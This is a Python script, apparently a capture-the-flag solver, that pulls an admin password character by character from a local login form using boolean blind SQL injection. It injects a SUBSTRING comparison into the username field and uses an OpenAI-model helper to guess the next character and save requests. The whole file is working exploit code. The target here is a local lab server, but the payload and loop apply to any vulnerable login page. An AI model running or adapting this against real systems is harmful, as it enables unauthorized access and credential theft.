import os
import requests
from charset_generator.yielding import yield_charset
from charset_generator.ai import assess_predictability, predict_next_char

import dotenv
dotenv.load_dotenv(override=True)

OPENAI_API_KEY = os.getenv("OPENAI_API_KEY")

FLAG_LENGTH = 38

URL = "http://127.0.0.1:5000"


def login(username, password):
    res = requests.post(
        f"{URL}/login", data={"username": username, "password": password})
    return res, res.text


def try_payload(payload):
    _, text = login(payload, "")
    return "Logged in!" in text


def gen_payload(known_flag):
    return f"Admin' AND SUBSTRING(password, 1, {len(known_flag)}) = '{known_flag}' --"


num_requests = 0
flag = ""
confidence = 0
for i in range(FLAG_LENGTH):
    char_found = False
    chars_tried = []
    if i > 0:
        confidence = assess_predictability(flag, OPENAI_API_KEY)
    if confidence == 0:
        charset = yield_charset("[!-~]")
    while True:
        if confidence > 0:
            c = predict_next_char(flag, OPENAI_API_KEY,
                                  banned_chars=chars_tried)
            print("Trying from AI:", c)
        else:
            try:
                c = next(charset)
            except StopIteration:
                print("No more characters to try")
                exit()
            print("Trying from charset:", c)
        chars_tried.append(c)
        if confidence > 0:
            confidence = 0
            charset = yield_charset("[!-~]")
        payload = gen_payload(flag + c)
        num_requests += 1
        if try_payload(payload):
            char_found = True
            flag += c
            print(flag)
            break
    assert char_found, "Failed to find character"

print(login("Admin", flag))
print("Number of requests:", num_requests)
